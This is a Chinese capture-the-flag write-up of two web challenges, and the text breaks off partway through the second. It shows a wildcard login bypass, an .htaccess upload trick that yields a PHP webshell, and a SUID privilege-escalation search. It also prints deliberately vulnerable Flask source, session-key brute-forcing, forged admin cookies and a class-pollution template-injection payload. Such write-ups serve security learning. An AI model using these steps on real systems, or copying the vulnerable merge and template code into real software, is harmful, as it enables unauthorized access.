<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="94a472c30da3eba7265d72dd3f2c9adf">WEB</h1>
<h2 data-content="1" id="1ef98b47a97559a1bc113e95859fb773">SQLUP</h2>
<p>打开题目给了一个登录页面结合名字猜测为SQL注入<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144552-fd79de02-6dad-1.png"/></p>
<p>查看源码发现有hint提示开发者使用的是模式匹配</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144600-026f4f1e-6dae-1.png"/></p>
<p>所以我尝试使用%来模糊匹配，登陆成功</p>
<pre><code>username=admin&amp;password=%</code></pre>
<p>进入面板之后发现有一个文件上传功能</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144616-0bfe5e62-6dae-1.png"/></p>
<p>尝试上传php文件，结果被waf，文件名字不能出现p<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144624-10a9d716-6dae-1.png"/></p>
<p>我想到了使用.htaccess文件来解析gif文件来getshell<br/>
先上传.htaccess文件, 将1.gif当作php解析</p>
<pre><code>&lt;FilesMatch "1.gif"&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144634-16c6b5f6-6dae-1.png"/><br/>
接着上传1.gif文件<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144649-1ff10604-6dae-1.png"/></p>
<p>之后访问<code>uploads/1.gif</code>即可getshell，但是还需要提权读取flag</p>
<p>寻找提权命令</p>
<pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
<p>发现tac命令可以使用</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144725-3568f528-6dae-1.png"/></p>
<h2 data-content="1" id="b808276abfc485b37a32bc63588f8467">CandyShop</h2>
<p>源码如下</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">datetime</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">make_response</span>
<span class="kn">from</span> <span class="nn">wtforms</span> <span class="kn">import</span> <span class="n">StringField</span><span class="p">,</span> <span class="n">PasswordField</span><span class="p">,</span> <span class="n">SubmitField</span>
<span class="kn">from</span> <span class="nn">wtforms.validators</span> <span class="kn">import</span> <span class="n">DataRequired</span><span class="p">,</span> <span class="n">Length</span>
<span class="kn">from</span> <span class="nn">flask_wtf</span> <span class="kn">import</span> <span class="n">FlaskForm</span>
<span class="kn">import</span> <span class="nn">re</span>


<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'xxxxxxx'</span>

<span class="k">class</span> <span class="nc">RegistrationForm</span><span class="p">(</span><span class="n">FlaskForm</span><span class="p">):</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s1">'Username'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">(),</span> <span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">20</span><span class="p">)])</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span><span class="s1">'Password'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">(),</span> <span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">20</span><span class="p">)])</span>
    <span class="n">submit</span> <span class="o">=</span> <span class="n">SubmitField</span><span class="p">(</span><span class="s1">'Register'</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">LoginForm</span><span class="p">(</span><span class="n">FlaskForm</span><span class="p">):</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">StringField</span><span class="p">(</span><span class="s1">'Username'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">(),</span> <span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">20</span><span class="p">)])</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">PasswordField</span><span class="p">(</span><span class="s1">'Password'</span><span class="p">,</span> <span class="n">validators</span><span class="o">=</span><span class="p">[</span><span class="n">DataRequired</span><span class="p">(),</span> <span class="n">Length</span><span class="p">(</span><span class="nb">min</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span> <span class="nb">max</span><span class="o">=</span><span class="mi">20</span><span class="p">)])</span>
    <span class="n">submit</span> <span class="o">=</span> <span class="n">SubmitField</span><span class="p">(</span><span class="s1">'Login'</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Candy</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">image</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">image</span> <span class="o">=</span> <span class="n">image</span>

<span class="k">class</span> <span class="nc">User</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>

    <span class="k">def</span> <span class="nf">verify_password</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="o">==</span><span class="n">username</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">password</span><span class="o">==</span><span class="n">password</span><span class="p">)</span>
<span class="k">class</span> <span class="nc">Admin</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="s2">""</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">identity</span> <span class="o">=</span> <span class="s2">""</span>

<span class="k">def</span> <span class="nf">sanitize_inventory_sold</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">'[a-zA-Z_]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">'__getitem__'</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>

<span class="n">candies</span> <span class="o">=</span> <span class="p">[</span><span class="n">Candy</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">"Lollipop"</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="s2">"images/candy1.jpg"</span><span class="p">),</span>
    <span class="n">Candy</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">"Chocolate Bar"</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="s2">"images/candy2.jpg"</span><span class="p">),</span>
    <span class="n">Candy</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">"Gummy Bears"</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="s2">"images/candy3.jpg"</span><span class="p">)</span>
<span class="p">]</span>
<span class="n">users</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">admin_user</span> <span class="o">=</span> <span class="p">[]</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/register'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="n">form</span> <span class="o">=</span> <span class="n">RegistrationForm</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">form</span><span class="o">.</span><span class="n">validate_on_submit</span><span class="p">():</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">form</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
        <span class="n">users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'login'</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'register.html'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/login'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="n">form</span> <span class="o">=</span> <span class="n">LoginForm</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">form</span><span class="o">.</span><span class="n">validate_on_submit</span><span class="p">():</span>
        <span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">u</span><span class="o">.</span><span class="n">verify_password</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span><span class="p">,</span> <span class="n">form</span><span class="o">.</span><span class="n">password</span><span class="o">.</span><span class="n">data</span><span class="p">):</span>
                <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span>
                <span class="n">session</span><span class="p">[</span><span class="s1">'identity'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"guest"</span>
                <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'home'</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'login.html'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>

<span class="n">inventory</span> <span class="o">=</span> <span class="mi">500</span>
<span class="n">sold</span> <span class="o">=</span> <span class="mi">0</span>
<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/home'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">inventory</span><span class="p">,</span> <span class="n">sold</span>
    <span class="n">message</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>

    <span class="k">if</span> <span class="n">sold</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="ow">and</span> <span class="n">sold</span> <span class="o">&lt;</span> <span class="mi">500</span><span class="p">:</span>
        <span class="n">sold</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="n">inventory</span> <span class="o">=</span> <span class="mi">500</span>
        <span class="n">message</span> <span class="o">=</span> <span class="s2">"But you have bought too many candies!"</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'home.html'</span><span class="p">,</span> <span class="n">inventory</span><span class="o">=</span><span class="n">inventory</span><span class="p">,</span> <span class="n">sold</span><span class="o">=</span><span class="n">sold</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">message</span><span class="p">,</span> <span class="n">candies</span><span class="o">=</span><span class="n">candies</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">:</span>
        <span class="n">action</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'action'</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">action</span> <span class="o">==</span> <span class="s2">"buy_candy"</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">inventory</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">inventory</span> <span class="o">-=</span> <span class="mi">3</span>
                <span class="n">sold</span> <span class="o">+=</span> <span class="mi">3</span>
            <span class="k">if</span> <span class="n">inventory</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">message</span> <span class="o">=</span> <span class="s2">"All candies are sold out!"</span>
            <span class="k">if</span> <span class="n">sold</span> <span class="o">&gt;=</span> <span class="mi">500</span><span class="p">:</span>
                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'secret.txt'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
                    <span class="n">message</span> <span class="o">=</span> <span class="nb">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'home.html'</span><span class="p">,</span> <span class="n">inventory</span><span class="o">=</span><span class="n">inventory</span><span class="p">,</span> <span class="n">sold</span><span class="o">=</span><span class="n">sold</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="n">message</span><span class="p">,</span> <span class="n">candies</span><span class="o">=</span><span class="n">candies</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/admin'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">identity</span> <span class="o">!=</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>
    <span class="n">admin</span> <span class="o">=</span> <span class="n">Admin</span><span class="p">()</span>
    <span class="n">merge</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="n">admin</span><span class="p">)</span>
    <span class="n">admin_user</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">admin</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'admin.html'</span><span class="p">,</span> <span class="n">view</span><span class="o">=</span><span class="s1">'index'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/admin/view_candies'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">view_candies</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">identity</span> <span class="o">!=</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'admin.html'</span><span class="p">,</span> <span class="n">view</span><span class="o">=</span><span class="s1">'candies'</span><span class="p">,</span> <span class="n">candies</span><span class="o">=</span><span class="n">candies</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/admin/add_candy'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">add_candy</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">identity</span> <span class="o">!=</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>
    <span class="n">candy_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">)</span>
    <span class="n">candy_image</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'image'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">candy_name</span> <span class="ow">and</span> <span class="n">candy_image</span><span class="p">:</span>
        <span class="n">new_candy</span> <span class="o">=</span> <span class="n">Candy</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="n">candy_name</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="n">candy_image</span><span class="p">)</span>
        <span class="n">candies</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">new_candy</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'admin.html'</span><span class="p">,</span> <span class="n">view</span><span class="o">=</span><span class="s1">'add_candy'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/admin/view_inventory'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">view_inventory</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">identity</span> <span class="o">!=</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>
    <span class="n">inventory_value</span> <span class="o">=</span> <span class="n">sanitize_inventory_sold</span><span class="p">(</span><span class="n">inventory</span><span class="p">)</span>
    <span class="n">sold_value</span> <span class="o">=</span> <span class="n">sanitize_inventory_sold</span><span class="p">(</span><span class="n">sold</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">"商店库存:"</span> <span class="o">+</span> <span class="n">inventory_value</span> <span class="o">+</span> <span class="s2">"已售出"</span> <span class="o">+</span> <span class="n">sold_value</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/admin/add_inventory'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">add_inventory</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">inventory</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">identity</span> <span class="o">!=</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'add'</span><span class="p">):</span>
        <span class="n">num</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'add'</span><span class="p">)</span>
        <span class="n">inventory</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'admin.html'</span><span class="p">,</span> <span class="n">view</span><span class="o">=</span><span class="s1">'add_inventory'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'index.html'</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">1337</span><span class="p">)</span>
</pre></div>
<p>爆破session key得到 a123456</p>
<pre><code>flask-unsign -u -c "eyJjc3JmX3Rva2VuIjoiYmI5N2MxMGJhYTlhZTUzZDhiMTQ5NWVkNTVkZjcxNjQ0OTc0NjY4ZiIsImlkZW50aXR5IjoiZ3Vlc3QiLCJ1c2VybmFtZSI6IjEyMyJ9.Zt0WUA.FitsqnryV6luxUpGkUgwqDK8UDA"</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144738-3ca1e840-6dae-1.png"/></p>
<p>session解密</p>
<div class="highlight"><pre><span></span>┌──<span class="p">(</span>kali㉿kali<span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span>Desktop<span class="o">/</span>flask<span class="o">-</span>session<span class="o">-</span>cookie<span class="o">-</span>manager<span class="o">-</span>master<span class="p">]</span>
└─<span class="o">$</span> python2 flask_session_cookie_manager2.py decode <span class="o">-</span><span class="kt">c</span> <span class="m">.</span>eJwNy8EKgCAMANB_2blDqW3Sz4S2LSQ0SDtE9O95ffBe2OqlazsPKbAAT6weoyhNihZn44PGjZwjGxGRrHBwZEYYILGUltrT135LbZ3uKlcJWToFzqnA9wOF2h3A.Zt025A.Z9OU_8Xax0lafOyjFTrx1WJ90qc

<span class="p">{</span><span class="s">"csrf_token"</span><span class="o">:</span><span class="s">"d1df86bef71f636528afbc74473b66673eda4720"</span><span class="p">,</span><span class="s">"identity"</span><span class="o">:</span><span class="s">"guest"</span><span class="p">,</span><span class="s">"username"</span><span class="o">:</span><span class="s">"admin"</span><span class="p">}</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144821-568387d2-6dae-1.png"/></p>
<p>伪造加密session</p>
<div class="highlight"><pre><span></span>┌──<span class="p">(</span>kali㉿kali<span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span>Desktop<span class="o">/</span>flask<span class="o">-</span>session<span class="o">-</span>cookie<span class="o">-</span>manager<span class="o">-</span>master<span class="p">]</span>
└─<span class="o">$</span> python3 flask_session_cookie_manager3.py encode <span class="o">-</span>s a123456 <span class="o">-</span>t <span class="s">'{"csrf_token":"d1df86bef71f636528afbc74473b66673eda4720","identity":"admin","username":"admin"}'</span>

eyJpZGVudGl0eSI6ImFkbWluIiwidXNlcm5hbWUiOiIxMjMifQ.Zt0hvg.ej8rVrvsHOttUQIIMgmE2w0kSto
</pre></div>
<p>伪造污染inventory</p>
<pre><code>python3 flask_session_cookie_manager3.py encode -s a123456 -t "{'identity':'admin','username':'123','__init__':{'__globals__':{'inventory':'{{7*7}}'}}}"</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144801-4a5489f2-6dae-1.png"/></p>
<p>观察源码发现存在原型链污染</p>
<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/admin'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">identity</span> <span class="o">!=</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>
    <span class="n">admin</span> <span class="o">=</span> <span class="n">Admin</span><span class="p">()</span>
    <span class="n">merge</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="n">admin</span><span class="p">)</span>
    <span class="n">admin_user</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">admin</span><span class="p">)</span>

